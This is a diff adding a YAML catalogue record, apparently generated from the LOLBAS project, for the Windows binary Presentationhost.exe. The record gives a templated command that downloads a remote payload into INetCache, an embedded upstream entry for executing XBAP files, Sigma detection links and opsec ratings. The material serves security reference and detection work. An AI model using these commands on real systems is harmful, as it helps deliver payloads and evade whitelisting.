@@ -1,0 +1,100 @@
+id: lolbas/T1NCaW5hcmllcy9QcmVzZW50YXRpb25ob3N0LnltbA/RG93bmxvYWQ/1
+type: binary
+platform: windows
+name: Presentationhost.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Execution of .xbap files may not be common on production workstations
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
+commands:
+- template: Presentationhost.exe {REMOTEURL}
+  comment: It will download a remote payload and place it in INetCache.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Presentationhost.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Presentationhost.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Presentationhost.exe\nDescription: File is used for executing Browser\
+        \ applications\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: Presentationhost.exe\
+        \ {PATH_ABSOLUTE:.xbap}\n    Description: Executes the target XAML Browser Application (XBAP)\
+        \ file\n    Usecase: Execute code within XBAP files\n    Category: Execute\n    Privileges: User\n\
+        \    MitreID: T1218\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows\
+        \ 10\n    Tags:\n      - Execute: XBAP\n  - Command: Presentationhost.exe {REMOTEURL}\n    Description:\
+        \ It will download a remote payload and place it in INetCache.\n    Usecase: Downloads payload\
+        \ from remote server\n    Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem:\
+        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n    Tags:\n      -\
+        \ Download: INetCache\nFull_Path:\n  - Path: C:\\Windows\\System32\\Presentationhost.exe\n  -\
+        \ Path: C:\\Windows\\SysWOW64\\Presentationhost.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml\n\
+        \  - IOC: Execution of .xbap files may not be common on production workstations\nResources:\n\
+        \  - Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf\n\
+        \  - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/\n\
+        Acknowledgement:\n  - Person: Casey Smith\n    Handle: '@subtee'\n  - Person: Nir Chako (Pentera)\n\
+        \    Handle: '@C_h4ck_0'\n"
+      document_sha256: sha256:070fea0b171554d170709ba91c77550413dbbfe82ddd013744c94e8e943ef335
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:b353d571c9d23a1b8e1f1ce372af1cc596491e7143c3d1665140272e8be927d5
